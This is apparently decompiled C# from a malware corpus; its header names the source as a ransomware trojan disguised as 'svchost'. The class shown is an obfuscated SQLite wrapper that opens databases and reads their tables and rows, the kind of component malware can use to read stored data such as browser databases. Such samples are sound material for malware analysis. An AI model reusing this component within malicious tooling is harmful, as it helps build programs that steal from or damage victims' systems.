// Decompiled with JetBrains decompiler
// Type: NVNtudTXiHmMvEjuoGX5.e599i6egHHo760
// Assembly: svchost, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E61EF89-92A4-48B5-8114-E738AD48C2C7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00022-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-ff23354d62eb4d0c6d7229a1b5427a7b9d9984002e8a8dc48588e1656395d7d7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;

namespace NVNtudTXiHmMvEjuoGX5
{
  public class e599i6egHHo760
  {
    private const int SQL_OK = 0;
    private const int SQL_ROW = 100;
    private const int SQL_DONE = 101;
    private IntPtr hGqnQFsOwUz0183;

    public e599i6egHHo760() => this.hGqnQFsOwUz0183 = IntPtr.Zero;

    public e599i6egHHo760(string baseName) => this.NboLh3KpZeTT258(baseName);

    [DllImport("kernel32", EntryPoint = "HeapAlloc")]
    private static extern IntPtr wnKRi8dx8qlM239(IntPtr heap, uint flags, uint bytes);

    [DllImport("kernel32", EntryPoint = "GetProcessHeap")]
    private static extern IntPtr f2twPGMMRzL8240();

    [DllImport("kernel32", EntryPoint = "lstrlen")]
    private static extern int rAtncDmocfE3241(IntPtr str);

    [DllImport("sqlite3", EntryPoint = "sqlite3_open")]
    private static extern int erIY049NJnTg242(IntPtr fileName, out IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_close")]
    private static extern int CIr0VBfWBBpH243(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_exec")]
    private static extern int FPlu4XzZnqin244(
      IntPtr database,
      IntPtr query,
      IntPtr callback,
      IntPtr arguments,
      out IntPtr errorr);

    [DllImport("sqlite3", EntryPoint = "sqlite3_errmsg")]
    private static extern IntPtr YNLNqYp4GcKu245(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2")]
    private static extern int bltAZIrC20jb246(
      IntPtr database,
      IntPtr query,
      int length,
      out IntPtr statement,
      out IntPtr tail);

    [DllImport("sqlite3", EntryPoint = "sqlite3_step")]
    private static extern int IEIMNUTcq427247(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_count")]
    private static extern int QswDck0s4QjJ248(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_name")]
    private static extern IntPtr tZZFYFlYtA4L249(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_type")]
    private static extern int fChMjy47jmKx250(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_int")]
    private static extern int bOqHZR6SlZjO251(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_double")]
    private static extern double VddKJ4DgnKoA252(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_text")]
    private static extern IntPtr \u0033e8wMbq6frta253(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_blob")]
    private static extern IntPtr fDYCtcpfitQ5254(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_bytes")]
    private static extern IntPtr kjoeIuaqqPEK255(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_table_name")]
    private static extern IntPtr IA59zcytK3v5256(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_finalize")]
    private static extern int \u00351Mak8hAo3bt257(IntPtr handle);

    public void NboLh3KpZeTT258(string baseName)
    {
      if (e599i6egHHo760.erIY049NJnTg242(this.nmXuXQl7KUJQ265(baseName), out this.hGqnQFsOwUz0183) != 0)
      {
        this.hGqnQFsOwUz0183 = IntPtr.Zero;
        throw new Exception("Error with opening database " + baseName + "!");
      }
    }

    public void \u0037gG6UnlhNi9H259()
    {
      if (!(this.hGqnQFsOwUz0183 != IntPtr.Zero))
        return;
      e599i6egHHo760.CIr0VBfWBBpH243(this.hGqnQFsOwUz0183);
    }

    public ArrayList HZ5hx3mFoCln260()
    {
      DataTable dataTable = this.sbF0HUFv2H3h262("SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1");
      ArrayList arrayList = new ArrayList();
      try
      {
        foreach (DataRow row in dataTable.Rows)
          arrayList.Add((object) row.ItemArray[0].ToString());
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return arrayList;
    }

    public void ONcGi55R7T34261(string query)
    {
      IntPtr errorr;
      e599i6egHHo760.FPlu4XzZnqin244(this.hGqnQFsOwUz0183, this.nmXuXQl7KUJQ265(query), IntPtr.Zero, IntPtr.Zero, out errorr);
      if (errorr != IntPtr.Zero)
        throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + this.e9ZSozaaTzP3266(e599i6egHHo760.YNLNqYp4GcKu245(errorr)));
    }

    public DataTable sbF0HUFv2H3h262(string query)
    {
      IntPtr statement;
      e599i6egHHo760.bltAZIrC20jb246(this.hGqnQFsOwUz0183, this.nmXuXQl7KUJQ265(query), this.hZx3WamgV8t2268(this.nmXuXQl7KUJQ265(query)), out statement, out IntPtr _);
      DataTable table = new DataTable();
      int num = this.XsRVReuuUih6263(statement, ref table);
      while (num == 100)
        num = this.bEYHchzOW0Pm264(statement, ref table);
      e599i6egHHo760.\u00351Mak8hAo3bt257(statement);
      return table;
    }

    private int XsRVReuuUih6263(IntPtr statement, ref DataTable table)
    {
      table = new DataTable("resultTable");
      if (e599i6egHHo760.IEIMNUTcq427247(statement) == 100)
      {
        int num1 = e599i6egHHo760.QswDck0s4QjJ248(statement);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int columnNumber = 0;
        while (columnNumber <= num2)
        {
          string columnName = this.e9ZSozaaTzP3266(e599i6egHHo760.tZZFYFlYtA4L249(statement, columnNumber));
          int num3 = e599i6egHHo760.fChMjy47jmKx250(statement, columnNumber);
          if (num3 == Conversion.Fix(1))
          {
            table.Columns.Add(columnName, Type.GetType("System.Int32"));
            objArray[columnNumber] = (object) e599i6egHHo760.bOqHZR6SlZjO251(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(2))
          {
            table.Columns.Add(columnName, Type.GetType("System.Single"));
            objArray[columnNumber] = (object) e599i6egHHo760.VddKJ4DgnKoA252(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(3))
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) this.e9ZSozaaTzP3266(e599i6egHHo760.\u0033e8wMbq6frta253(statement, columnNumber));
          }
          else if (num3 == Conversion.Fix(4))
          {
            table.Columns.Add(columnName, Type.GetType("System.Array"));
            int siz = (int) e599i6egHHo760.kjoeIuaqqPEK255(statement, columnNumber);
            objArray[columnNumber] = (object) this.VXiK7elWDvxv267(e599i6egHHo760.fDYCtcpfitQ5254(statement, columnNumber), siz);
          }
          else
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) "";
          }
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
      }
      return e599i6egHHo760.IEIMNUTcq427247(statement);
    }

    private int bEYHchzOW0Pm264(IntPtr statement, ref DataTable table)
    {
      int num1;
      try
      {
        int num2 = e599i6egHHo760.QswDck0s4QjJ248(statement);
        object[] objArray = new object[checked (num2 - 1 + 1)];
        int num3 = checked (num2 - 1);
        int columnNumber = 0;
        while (columnNumber <= num3)
        {
          int num4 = e599i6egHHo760.fChMjy47jmKx250(statement, columnNumber);
          if (num4 == Conversion.Fix(1))
            objArray[columnNumber] = (object) e599i6egHHo760.bOqHZR6SlZjO251(statement, columnNumber);
          else if (num4 == Conversion.Fix(2))
            objArray[columnNumber] = (object) e599i6egHHo760.VddKJ4DgnKoA252(statement, columnNumber);
          else if (num4 == Conversion.Fix(3))
            objArray[columnNumber] = (object) this.e9ZSozaaTzP3266(e599i6egHHo760.\u0033e8wMbq6frta253(statement, columnNumber));
          else if (num4 == Conversion.Fix(4))
          {
            int siz = (int) e599i6egHHo760.kjoeIuaqqPEK255(statement, columnNumber);
            objArray[columnNumber] = (object) this.VXiK7elWDvxv267(e599i6egHHo760.fDYCtcpfitQ5254(statement, columnNumber), siz);
          }
          else
            objArray[columnNumber] = (object) "";
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
        num1 = e599i6egHHo760.IEIMNUTcq427247(statement);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return num1;
    }

    private IntPtr nmXuXQl7KUJQ265(string str)
    {
      if (str == null)
        return IntPtr.Zero;
      byte[] bytes1 = Encoding.UTF8.GetBytes(str);
      int bytes2 = checked (bytes1.Length + 1);
      IntPtr num = e599i6egHHo760.wnKRi8dx8qlM239(e599i6egHHo760.f2twPGMMRzL8240(), 0U, checked ((uint) bytes2));
      Marshal.Copy(bytes1, 0, num, bytes1.Length);
      Marshal.WriteByte(num, bytes1.Length, (byte) 0);
      return num;
    }

    private string e9ZSozaaTzP3266(IntPtr ptr)
    {
      if (ptr == IntPtr.Zero)
        return (string) null;
      Encoding utF8 = Encoding.UTF8;
      int num = this.hZx3WamgV8t2268(ptr);
      byte[] numArray = new byte[checked (num - 1 + 1)];
      Marshal.Copy(ptr, numArray, 0, num);
      return utF8.GetString(numArray, 0, num);
    }

    private Array VXiK7elWDvxv267(IntPtr ptr, int siz)
    {
      if (ptr == IntPtr.Zero)
        return (Array) null;
      Encoding utF8 = Encoding.UTF8;
      this.hZx3WamgV8t2268(ptr);
      byte[] destination = new byte[checked (siz - 1 + 1)];
      Marshal.Copy(ptr, destination, 0, siz);
      return (Array) destination;
    }

    private int hZx3WamgV8t2268(IntPtr ptr) => ptr == IntPtr.Zero ? 0 : e599i6egHHo760.rAtncDmocfE3241(ptr);

    public enum yBZvzMcJBuBo61
    {
      INT = 1,
      FLOAT = 2,
      TEXT = 3,
      BLOB = 4,
      NULL = 5,
    }
  }
}
